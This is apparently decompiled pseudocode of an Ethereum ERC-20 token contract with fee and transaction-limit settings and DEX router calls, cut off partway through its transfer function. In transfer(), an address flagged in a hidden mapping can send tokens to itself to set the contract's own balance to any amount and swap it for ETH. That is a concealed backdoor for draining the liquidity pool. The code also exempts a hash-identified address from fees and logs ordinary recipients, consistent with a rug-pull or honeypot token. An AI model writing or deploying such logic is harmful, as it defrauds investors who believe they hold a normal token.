contract main {




// =====================  Runtime code  =====================


#
#  - transferFrom(address arg1, address arg2, uint256 arg3)
#
address owner;
uint256 _decimals;
uint256 _totalSupply;
uint256 _maxTxAmount;
uint256 _maxWallet;
uint256 _liquidityFee;
uint256 _marketingFee;
array of struct stor7;
array of struct stor8;
uint256 _fee;
address stor10;
uint8 stor11; offset 160
address sub_4bf28fd0Address;
mapping of uint256 balanceOf;
mapping of uint256 allowance;
mapping of uint8 stor16;
uint8 stor18;
array of struct stor19;
array of uint256 stor46529144392117707452946260303848603952187628831689540306122340668716214558865;

function sub_09afb3ce(?) payable {
    return bool(stor11)
}

function totalSupply() payable {
    return _totalSupply
}

function _marketingFee() payable {
    return _marketingFee
}

function decimals() payable {
    return _decimals
}

function _decimals() payable {
    return _decimals
}

function _totalSupply() payable {
    return _totalSupply
}

function sub_4bf28fd0(?) payable {
    return sub_4bf28fd0Address
}

function _liquidityFee() payable {
    return _liquidityFee
}

function balanceOf(address arg1) payable {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return balanceOf[address(arg1)]
}

function _maxTxAmount() payable {
    return _maxTxAmount
}

function _maxWallet() payable {
    return _maxWallet
}

function owner() payable {
    return owner
}

function _fee() payable {
    return _fee
}

function allowance(address arg1, address arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return allowance[address(arg1)][address(arg2)]
}

function _fallback() payable {
    revert
}

function renounceOwnership() payable {
    if owner != msg.sender:
        revert with 0, 'Ownable: caller is not the owner'
    emit OwnershipTransferred(owner, 0);
    owner = 0
}

function approve(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = arg2
    emit Approval(arg2, msg.sender, arg1);
    return 1
}

function increaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    if allowance[msg.sender][address(arg1)] > !arg2:
        revert with 0, 17
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = allowance[msg.sender][address(arg1)] + arg2
    emit Approval((allowance[msg.sender][address(arg1)] + arg2), msg.sender, arg1);
    return 1
}

function decreaseAllowance(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 <= allowance[msg.sender][address(arg1)]
    if allowance[msg.sender][address(arg1)] < arg2:
        revert with 0, 17
    if not msg.sender:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve from the zero address'
    if not arg1:
        revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve to the zero address'
    allowance[address(msg.sender)][address(arg1)] = allowance[msg.sender][address(arg1)] - arg2
    emit Approval((allowance[msg.sender][address(arg1)] - arg2), msg.sender, arg1);
    return 1
}

function name() payable {
    if bool(stor7.length):
        if bool(stor7.length) == uint255(stor7.length) * 0.5 < 32:
            revert with 0, 34
        if bool(stor7.length):
            if bool(stor7.length) == uint255(stor7.length) * 0.5 < 32:
                revert with 0, 34
            if Mask(256, -1, stor7.length):
                if 31 < uint255(stor7.length) * 0.5:
                    mem[128] = uint256(stor7.field_0)
                    idx = 128
                    s = 0
                    while (uint255(stor7.length) * 0.5) + 96 > idx:
                        mem[idx + 32] = stor7[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor7.length), data=mem[128 len ceil32(uint255(stor7.length) * 0.5)])
                mem[128] = 256 * stor7.length.field_8
        else:
            if bool(stor7.length) == stor7.length.field_1 < 32:
                revert with 0, 34
            if stor7.length.field_1:
                if 31 < stor7.length.field_1:
                    mem[128] = uint256(stor7.field_0)
                    idx = 128
                    s = 0
                    while stor7.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor7[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor7.length), data=mem[128 len ceil32(uint255(stor7.length) * 0.5)])
                mem[128] = 256 * stor7.length.field_8
        mem[ceil32(uint255(stor7.length) * 0.5) + 192 len ceil32(uint255(stor7.length) * 0.5)] = mem[128 len ceil32(uint255(stor7.length) * 0.5)]
        if ceil32(uint255(stor7.length) * 0.5) > uint255(stor7.length) * 0.5:
            mem[ceil32(uint255(stor7.length) * 0.5) + (uint255(stor7.length) * 0.5) + 192] = 0
        return Array(len=2 * Mask(256, -1, stor7.length), data=mem[128 len ceil32(uint255(stor7.length) * 0.5)], mem[(2 * ceil32(uint255(stor7.length) * 0.5)) + 192 len 2 * ceil32(uint255(stor7.length) * 0.5)]), 
    if bool(stor7.length) == stor7.length.field_1 < 32:
        revert with 0, 34
    if bool(stor7.length):
        if bool(stor7.length) == uint255(stor7.length) * 0.5 < 32:
            revert with 0, 34
        if Mask(256, -1, stor7.length):
            if 31 < uint255(stor7.length) * 0.5:
                mem[128] = uint256(stor7.field_0)
                idx = 128
                s = 0
                while (uint255(stor7.length) * 0.5) + 96 > idx:
                    mem[idx + 32] = stor7[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor7.length % 128, data=mem[128 len ceil32(stor7.length.field_1)])
            mem[128] = 256 * stor7.length.field_8
    else:
        if bool(stor7.length) == stor7.length.field_1 < 32:
            revert with 0, 34
        if stor7.length.field_1:
            if 31 < stor7.length.field_1:
                mem[128] = uint256(stor7.field_0)
                idx = 128
                s = 0
                while stor7.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor7[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor7.length % 128, data=mem[128 len ceil32(stor7.length.field_1)])
            mem[128] = 256 * stor7.length.field_8
    mem[ceil32(stor7.length.field_1) + 192 len ceil32(stor7.length.field_1)] = mem[128 len ceil32(stor7.length.field_1)]
    if ceil32(stor7.length.field_1) > stor7.length.field_1:
        mem[ceil32(stor7.length.field_1) + stor7.length.field_1 + 192] = 0
    return Array(len=stor7.length % 128, data=mem[128 len ceil32(stor7.length.field_1)], mem[(2 * ceil32(stor7.length.field_1)) + 192 len 2 * ceil32(stor7.length.field_1)]), 
}

function symbol() payable {
    if bool(stor8.length):
        if bool(stor8.length) == uint255(stor8.length) * 0.5 < 32:
            revert with 0, 34
        if bool(stor8.length):
            if bool(stor8.length) == uint255(stor8.length) * 0.5 < 32:
                revert with 0, 34
            if Mask(256, -1, stor8.length):
                if 31 < uint255(stor8.length) * 0.5:
                    mem[128] = uint256(stor8.field_0)
                    idx = 128
                    s = 0
                    while (uint255(stor8.length) * 0.5) + 96 > idx:
                        mem[idx + 32] = stor8[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor8.length), data=mem[128 len ceil32(uint255(stor8.length) * 0.5)])
                mem[128] = 256 * stor8.length.field_8
        else:
            if bool(stor8.length) == stor8.length.field_1 < 32:
                revert with 0, 34
            if stor8.length.field_1:
                if 31 < stor8.length.field_1:
                    mem[128] = uint256(stor8.field_0)
                    idx = 128
                    s = 0
                    while stor8.length.field_1 + 96 > idx:
                        mem[idx + 32] = stor8[s].field_256
                        idx = idx + 32
                        s = s + 1
                        continue 
                    return Array(len=2 * Mask(256, -1, stor8.length), data=mem[128 len ceil32(uint255(stor8.length) * 0.5)])
                mem[128] = 256 * stor8.length.field_8
        mem[ceil32(uint255(stor8.length) * 0.5) + 192 len ceil32(uint255(stor8.length) * 0.5)] = mem[128 len ceil32(uint255(stor8.length) * 0.5)]
        if ceil32(uint255(stor8.length) * 0.5) > uint255(stor8.length) * 0.5:
            mem[ceil32(uint255(stor8.length) * 0.5) + (uint255(stor8.length) * 0.5) + 192] = 0
        return Array(len=2 * Mask(256, -1, stor8.length), data=mem[128 len ceil32(uint255(stor8.length) * 0.5)], mem[(2 * ceil32(uint255(stor8.length) * 0.5)) + 192 len 2 * ceil32(uint255(stor8.length) * 0.5)]), 
    if bool(stor8.length) == stor8.length.field_1 < 32:
        revert with 0, 34
    if bool(stor8.length):
        if bool(stor8.length) == uint255(stor8.length) * 0.5 < 32:
            revert with 0, 34
        if Mask(256, -1, stor8.length):
            if 31 < uint255(stor8.length) * 0.5:
                mem[128] = uint256(stor8.field_0)
                idx = 128
                s = 0
                while (uint255(stor8.length) * 0.5) + 96 > idx:
                    mem[idx + 32] = stor8[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor8.length % 128, data=mem[128 len ceil32(stor8.length.field_1)])
            mem[128] = 256 * stor8.length.field_8
    else:
        if bool(stor8.length) == stor8.length.field_1 < 32:
            revert with 0, 34
        if stor8.length.field_1:
            if 31 < stor8.length.field_1:
                mem[128] = uint256(stor8.field_0)
                idx = 128
                s = 0
                while stor8.length.field_1 + 96 > idx:
                    mem[idx + 32] = stor8[s].field_256
                    idx = idx + 32
                    s = s + 1
                    continue 
                return Array(len=stor8.length % 128, data=mem[128 len ceil32(stor8.length.field_1)])
            mem[128] = 256 * stor8.length.field_8
    mem[ceil32(stor8.length.field_1) + 192 len ceil32(stor8.length.field_1)] = mem[128 len ceil32(stor8.length.field_1)]
    if ceil32(stor8.length.field_1) > stor8.length.field_1:
        mem[ceil32(stor8.length.field_1) + stor8.length.field_1 + 192] = 0
    return Array(len=stor8.length % 128, data=mem[128 len ceil32(stor8.length.field_1)], mem[(2 * ceil32(stor8.length.field_1)) + 192 len 2 * ceil32(stor8.length.field_1)]), 
}

function transfer(address arg1, uint256 arg2) payable {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require msg.sender
    require arg1
    mem[32] = 16
    if stor16[msg.sender]:
        if arg1 == msg.sender:
            if not this.address:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve from the zero address'
            if not stor10:
                revert with 0x8c379a000000000000000000000000000000000000000000000000000000000, 'IERC20: approve to the zero address'
            allowance[address(this.address)][stor10] = arg2
            emit Approval(arg2, this.address, stor10);
            balanceOf[this.address] = arg2
            mem[128] = this.address
            require ext_code.size(stor10)
            staticcall stor10.WETH() with:
                    gas gas_remaining wei
            mem[192] = ext_call.return_data[0]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            require return_data.size >= 32
            require ext_call.return_data[0] == ext_call.return_data[12 len 20]
            mem[160] = ext_call.return_data[12 len 20]
            stor18 = 1
            if 20 > !block.timestamp:
                revert with 0, 17
            mem[ceil32(return_data.size) + 192] = 0x791ac94700000000000000000000000000000000000000000000000000000000
            mem[ceil32(return_data.size) + 196] = arg2
            idx = 0
            s = ceil32(return_data.size) + 388
            t = 128
            while idx < 2:
                mem[s] = mem[t + 12 len 20]
                idx = idx + 1
                s = s + 32
                t = t + 32
                continue 
            require ext_code.size(stor10)
            call stor10.swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) with:
                 gas gas_remaining wei
                args arg2, 0, 160, address(arg1), block.timestamp + 20, 2, mem[ceil32(return_data.size) + 388 len 64]
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            stor18 = 0
        else:
            if stor18:
                require ext_code.size(stor10)
                staticcall stor10.factory() with:
                        gas gas_remaining wei
                mem[96] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                require ext_code.size(stor10)
                staticcall stor10.WETH() with:
                        gas gas_remaining wei
                mem[ceil32(return_data.size) + 96] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[(2 * ceil32(return_data.size)) + 100] = this.address
                mem[(2 * ceil32(return_data.size)) + 132] = address(ext_call.return_data[0])
                require ext_code.size(address(ext_call.return_data[0]))
                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(ext_call.return_data[0])
                mem[(2 * ceil32(return_data.size)) + 96] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                mem[64] = (4 * ceil32(return_data.size)) + 96
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                if ext_call.return_data[12 len 20] != msg.sender:
                    require ext_code.size(stor10)
                    staticcall stor10.factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor10)
                    staticcall stor10.WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if arg1 == ext_call.return_data[12 len 20]:
                        if stor16[address(msg.sender)]:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(arg1):
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if this.address == arg1:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor18:
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if not arg2:
                                require arg2 <= _maxTxAmount
                                require ext_code.size(stor10)
                                staticcall stor10.factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 212] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 212] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(stor10)
                                staticcall stor10.WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 216 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 216] = this.address
                                mem[(12 * ceil32(return_data.size)) + 248] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 280 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < 0:
                                        revert with 0, 17
                                    if balanceOf[0] > -1:
                                        revert with 0, 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !arg2:
                                        revert with 0, 17
                                    balanceOf[arg1] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)]
                                stor19.length++
                                stor19[stor19.length].field_0 = arg1
                                stor66DE[stor19.length] = arg2
                                if arg2 < 0:
                                    revert with 0, 17
                                if balanceOf[0] > -1:
                                    revert with 0, 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !arg2:
                                    revert with 0, 17
                                balanceOf[arg1] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(14 * ceil32(return_data.size)) + 308 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                            else:
                                if arg2 and _fee > -1 / arg2:
                                    revert with 0, 17
                                if not arg2:
                                    revert with 0, 18
                                if arg2 * _fee / arg2 != _fee:
                                    revert with 0, 'SafeMath: multiplication overflow'
                                require arg2 <= _maxTxAmount
                                require ext_code.size(stor10)
                                staticcall stor10.factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 212] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 212] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(stor10)
                                staticcall stor10.WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 216 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 216] = this.address
                                mem[(12 * ceil32(return_data.size)) + 248] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 280 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 0, 17
                                    if balanceOf[0] > !(arg2 * _fee / 100):
                                        revert with 0, 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 0, 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                        revert with 0, 17
                                    balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)]
                                stor19.length++
                                stor19[stor19.length].field_0 = arg1
                                stor66DE[stor19.length] = arg2
                                if arg2 < arg2 * _fee / 100:
                                    revert with 0, 17
                                if balanceOf[0] > !(arg2 * _fee / 100):
                                    revert with 0, 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 0, 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[arg1] > !(arg2 - (arg2 * _fee / 100)):
                                    revert with 0, 17
                                balanceOf[arg1] = balanceOf[arg1] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
                                              mem[(14 * ceil32(return_data.size)) + 308 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(14 * ceil32(return_data.size)) + 308 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                            return 1, mem[(14 * ceil32(return_data.size)) + 308 len 24 * ceil32(return_data.size)]
                    require ext_code.size(stor10)
                    staticcall stor10.factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(stor10)
                    staticcall stor10.WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if stor16[address(msg.sender)]:
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if stor16[address(arg1)]:
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba == sha3(arg1):
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if this.address == arg1:
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if ext_call.return_data[12 len 20] != msg.sender:
                        if msg.sender == address(ext_call.return_data[0]):
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    else:
                        if stor16[address(arg1)]:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(arg2, msg.sender, arg1);
                            return 1
                    if stor18:
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if not arg2:
                        require arg2 <= _maxTxAmount
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 216] = this.address
                        mem[(15 * ceil32(return_data.size)) + 248] = address(ext_call.return_data[0])
                        require ext_code.size(address(ext_call.return_data[0]))
                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(ext_call.return_data[0]), mem[(15 * ceil32(return_data.size)) + 280 len 5 * ceil32(return_data.size)]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        if ext_call.return_data[12 len 20] == arg1:
                            if arg2 < 0:
                                revert with 0, 17
                            if balanceOf[0] > -1:
                                revert with 0, 17
                            if balanceOf[address(msg.sender)] < arg2:
                                revert with 0, 17
                            balanceOf[address(msg.sender)] -= arg2
                            if balanceOf[arg1] > !arg2:
                                revert with 0, 17
                            balanceOf[arg1] += arg2
                            emit Transfer(address arg1, address arg2, uint256 arg3):
                                          arg2,
                                          mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)],
                                          msg.sender,
                                          arg1,
                            return 1, mem[(17 * ceil32(return_data.size)) + 244 len 9 * ceil32(return_data.size)]
                        stor19.length++
                        stor19[stor19.length].field_0 = arg1
                        stor66DE[stor19.length] = arg2
                        if arg2 < 0:
                            revert with 0, 17
                        if balanceOf[0] > -1:
                            revert with 0, 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 0, 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[arg1] > !arg2:
                            revert with 0, 17
                        balanceOf[arg1] += arg2
                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                      arg2,
                                      mem[(17 * ceil32(return_data.size)) + 308 len 9 * ceil32(return_data.size)],
                                      msg.sender,
                                      arg1,
                    else:
                        if arg2 and _fee > -1 / arg2:
                            revert with 0, 17
                        if not arg2:
                            revert with 0, 18
                        if arg2 * _fee / arg2 != _fee:
                            revert with 0, 'SafeMath: multiplication overflow'
                        require arg2 <= _maxTxAmount
                        require ext_code.size(stor10)
                        staticcall stor10.factory() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        require ext_code.size(stor10)
                        staticcall stor10.WETH() with:
                                gas gas_remaining wei
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        require return_data.size >= 32
                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                        mem[(15 * ceil32(return_data.size)) + 216] = this.address
